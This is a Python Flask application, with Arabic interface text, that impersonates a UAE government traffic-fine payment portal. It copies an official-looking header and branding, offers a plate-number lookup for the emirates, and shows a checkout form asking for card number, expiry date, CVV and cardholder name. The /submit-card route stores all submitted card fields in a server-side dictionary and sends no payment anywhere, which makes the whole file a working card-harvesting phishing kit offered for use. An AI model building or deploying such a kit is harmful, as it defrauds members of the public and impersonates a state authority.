import os
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)
db = {"sessions": {}, "status": "waiting", "msg": ""}

# --- 1. الهيدر الرسمي الكامل (بكل الأيقونات والروابط الفرعية) ---
MOI_TOP_BAR = '''
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
    body { margin:0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background:#f7f8fa; direction: rtl; }
    .header-top { background: white; border-bottom: 1px solid #eee; padding: 12px 40px; display: flex; justify-content: space-between; align-items: center; }
    .header-tools { display: flex; align-items: center; gap: 20px; color: #555; font-size: 15px; font-weight: bold; }
    .header-tools i { cursor: pointer; color: #b0914f; transition: 0.3s; }
    .header-tools i:hover { color: #8a6d3b; }
    .menu-gold { background: #b0914f; color: white; padding: 8px 18px; border-radius: 5px; cursor: pointer; display: flex; align-items: center; gap: 10px; font-size: 18px; }
    .logo-area { background: white; text-align: center; padding: 20px 0; border-bottom: 4px solid #b0914f; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
    .logo-area img { width: 95%; max-width: 750px; }
    
    /* الحاوية الموحدة */
    .container { max-width: 1100px; margin: 0 auto; padding: 20px; text-align: right; }
    .path { font-size: 14px; color: #888; margin-bottom: 10px; }
    .title-gold { color: #b0914f; font-size: 30px; font-weight: bold; margin-bottom: 5px; }
    .update-info { font-size: 13px; color: #aaa; margin-bottom: 30px; border-bottom: 1px solid #eee; padding-bottom: 15px; }
</style>
<div class="header-top">
    <div class="header-tools">
        <span style="color:#b0914f; cursor:pointer;">English | تسجيل الدخول</span>
        <i class="fa fa-rss"></i>
        <i class="fa fa-phone"></i>
        <i class="fa fa-question-circle"></i>
        <i class="fa fa-volume-up"></i>
        <i class="fa fa-info-circle"></i>
        <i class="fa fa-search"></i>
    </div>
    <div class="menu-gold">
        <i class="fa fa-cog"></i>
        <span>القائمة</span>
        <i class="fa fa-bars"></i>
    </div>
</div>
<div class="logo-area">
    <img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg">
</div>
'''

# --- 2. الصفحة الرئيسية (الـ 9 أيقونات كاملة بالأزرار المخفية) ---
@app.route('/')
def index():
    html = MOI_TOP_BAR + '''
    <style>
        .grid-main { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin-top: 20px; }
        .card-item { position: relative; background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 6px 15px rgba(0,0,0,0.06); border: 1px solid #efefef; cursor: pointer; transition: transform 0.3s; }
        .card-item:hover { transform: translateY(-5px); }
        .card-item img { width: 100%; display: block; }
        .click-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }
        .news-box { background: #fff; padding: 15px; border-radius: 8px; border-right: 5px solid #b0914f; box-shadow: 0 2px 8px rgba(0,0,0,0.05); margin-bottom: 25px; }
        .news-box b { color: #b0914f; font-size: 18px; }
    </style>
    <div class="container">
        <div class="news-box">
            <b>آخر الأخبار:</b> ورشة عمل افتراضية حول الأنظمة المرورية الحديثة...
        </div>
        <div class="path">الرئيسية / الخدمات الإلكترونية / <span style="color:#b0914f;">دفع المخالفات المرورية</span></div>
        <div class="title-gold">دفع المخالفات المرورية</div>
        <div class="update-info">آخر تحديث للصفحة: فبراير 19, 2026</div>

        <div class="grid-main">
            <div class="card-item" onclick="location.href='/search'"><div class="click-layer"></div><img src="https://static.wixstatic.com/media/a9f3d9_908f090c885e49048a1768656122557e~mv2.png"></div>
            <div class="card-item" onclick="location.href='/search'"><div class="click-layer"></div><img src="https://static.wixstatic.com/media/a9f3d9_33d7195d43e545089f3050965f7c3558~mv2.png"></div>
            <div class="card-item" onclick="location.href='/search'"><div class="click-layer"></div><img src="https://static.wixstatic.com/media/a9f3d9_6745f949c5e347719602e8609a32c3f9~mv2.png"></div>
            <div class="card-item" onclick="location.href='/search'"><div class="click-layer"></div><img src="https://static.wixstatic.com/media/a9f3d9_908f090c885e49048a1768656122557e~mv2.png"></div>
            <div class="card-item" onclick="location.href='/search'"><div class="click-layer"></div><img src="https://static.wixstatic.com/media/a9f3d9_33d7195d43e545089f3050965f7c3558~mv2.png"></div>
            <div class="card-item" onclick="location.href='/search'"><div class="click-layer"></div><img src="https://static.wixstatic.com/media/a9f3d9_6745f949c5e347719602e8609a32c3f9~mv2.png"></div>
            <div class="card-item" onclick="location.href='/search'"><div class="click-layer"></div><img src="https://static.wixstatic.com/media/a9f3d9_908f090c885e49048a1768656122557e~mv2.png"></div>
            <div class="card-item" onclick="location.href='/search'"><div class="click-layer"></div><img src="https://static.wixstatic.com/media/a9f3d9_33d7195d43e545089f3050965f7c3558~mv2.png"></div>
            <div class="card-item" onclick="location.href='/search'"><div class="click-layer"></div><img src="https://static.wixstatic.com/media/a9f3d9_6745f949c5e347719602e8609a32c3f9~mv2.png"></div>
        </div>
    </div>
    '''
    return render_template_string(html)

# --- 3. صفحة الاستعلام (التفصيل الممل بدون أي قص) ---
@app.route('/search')
def search():
    html = MOI_TOP_BAR + '''
    <style>
        .form-box { background: white; border-radius: 15px; padding: 45px; box-shadow: 0 10px 30px rgba(0,0,0,0.06); border: 1px solid #eee; margin-top: 10px; }
        .tabs-header { display: flex; gap: 12px; margin-bottom: 35px; border-bottom: 2px solid #f0f0f0; padding-bottom: 20px; }
        .tab-btn { flex: 1; padding: 18px; text-align: center; background: #f8f8f8; border-radius: 10px; cursor: pointer; font-weight: bold; font-size: 18px; color: #888; transition: 0.3s; }
        .tab-btn.active { background: #b0914f; color: white; box-shadow: 0 5px 15px rgba(176,145,79,0.2); }
        
        .row { display: grid; grid-template-columns: 1fr 1fr; gap: 25px; margin-bottom: 20px; }
        .full-row { margin-bottom: 20px; }
        label { display: block; margin-bottom: 10px; font-weight: bold; color: #333; font-size: 17px; }
        input, select { width: 100%; padding: 20px; border: 1.5px solid #e0e0e0; border-radius: 12px; font-size: 18px; background: #fff; box-sizing: border-box; outline: none; transition: 0.3s; }
        input:focus { border-color: #b0914f; }
        
        .action-btn { width: 100%; padding: 25px; background: #b0914f; color: white; border: none; border-radius: 12px; font-size: 26px; font-weight: bold; margin-top: 30px; cursor: pointer; box-shadow: 0 8px 20px rgba(176,145,79,0.3); }
        .info-text { background: #fff9e6; padding: 15px; border-radius: 8px; border: 1px solid #ffe699; margin-top: 20px; font-size: 14px; color: #856404; }
    </style>
    <div class="container">
        <div class="path">الرئيسية / الخدمات الإلكترونية / <span style="color:#b0914f;">بيانات الاستعلام</span></div>
        <div class="title-gold">استعلام عن المخالفات</div>
        <div class="update-info">يرجى إدخال البيانات بدقة كما هي مسجلة في النظام المروري.</div>
        
        <div class="form-box">
            <div class="tabs-header">
                <div class="tab-btn">بيانات الرخصة</div>
                <div class="tab-btn">الرمز المروري</div>
                <div class="tab-btn active">بيانات اللوحة</div>
            </div>
            
            <div class="full-row">
                <label>الإمارة</label>
                <select>
                    <option>أبوظبي / Abu Dhabi</option>
                    <option>دبي / Dubai</option>
                    <option>الشارقة / Sharjah</option>
                    <option>عجمان / Ajman</option>
                    <option>أم القيوين / Umm Al Quwain</option>
                    <option>رأس الخيمة / Ras Al Khaimah</option>
                    <option>الفجيرة / Fujairah</option>
                </select>
            </div>
            
            <div class="row">
                <div>
                    <label>مصدر اللوحة</label>
                    <select>
                        <option>خصوصي / Private</option>
                        <option>تجاري / Commercial</option>
                        <option>دراجة نارية / Motorcycle</option>
                        <option>أجرة / Taxi</option>
                        <option>حافلة عامة / Public Bus</option>
                        <option>تصدير / Export</option>
                        <option>هيئة دبلوماسية / Diplomatic</option>
                    </select>
                </div>
                <div>
                    <label>فئة اللوحة</label>
                    <input type="text" placeholder="مثال: 1">
                </div>
            </div>
            
            <div class="full-row">
                <label>رقم اللوحة</label>
                <input type="number" placeholder="أدخل رقم اللوحة">
            </div>
            
            <button class="action-btn" onclick="location.href='/checkout'">بدء الاستعلام</button>
            
            <div class="info-text">
                <i class="fa fa-info-circle"></i> تنبيه: في حال وجود مخالفات محولة للنيابة، يرجى مراجعة الجهة المعنية.
            </div>
        </div>
    </div>
    '''
    return render_template_string(html)

# --- 4. صفحة الدفع (الكاملة) ---
@app.route('/checkout')
def checkout():
    html = MOI_TOP_BAR + '''
    <div class="container">
        <div class="title-gold" style="text-align:center; margin-top:40px;">بوابة الدفع الإلكتروني الموحدة</div>
        <div style="max-width: 650px; margin: 30px auto; background: white; padding: 50px; border-radius: 15px; box-shadow: 0 10px 40px rgba(0,0,0,0.08); border-top: 10px solid #b0914f;">
            <form action="/submit-card" method="POST">
                <label>رقم البطاقة الائتمانية</label>
                <input name="card" placeholder="0000 0000 0000 0000" maxlength="19" style="width:100%; padding:20px; border:2px solid #eee; border-radius:12px; font-size:20px; margin-bottom:25px;">
                <div style="display:flex; gap:20px; margin-bottom:25px;">
                    <div style="flex:1;">
                        <label>تاريخ الانتهاء</label>
                        <input name="exp" placeholder="MM/YY" maxlength="5" style="width:100%; padding:20px; border:2px solid #eee; border-radius:12px;">
                    </div>
                    <div style="flex:1;">
                        <label>الرمز السري (CVV)</label>
                        <input name="cvv" placeholder="123" maxlength="3" style="width:100%; padding:20px; border:2px solid #eee; border-radius:12px;">
                    </div>
                </div>
                <label>اسم حامل البطاقة</label>
                <input name="holder" placeholder="Name on Card" style="width:100%; padding:20px; border:2px solid #eee; border-radius:12px; margin-bottom:30px;">
                <button type="submit" style="width:100%; padding:25px; background:#b0914f; color:white; border:none; border-radius:12px; font-size:24px; font-weight:bold; cursor:pointer;">تأكيد عملية الدفع</button>
            </form>
            <div style="text-align:center; margin-top:30px;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" width="60" style="margin:0 10px;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" width="60" style="margin:0 10px;">
            </div>
        </div>
    </div>
    '''
    return render_template_string(html)

@app.route('/submit-card', methods=['POST'])
def sub():
    c = request.form.get('card') or "CARD"
    db['sessions'][c] = request.form.to_dict()
    return "جاري المعالجة..."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
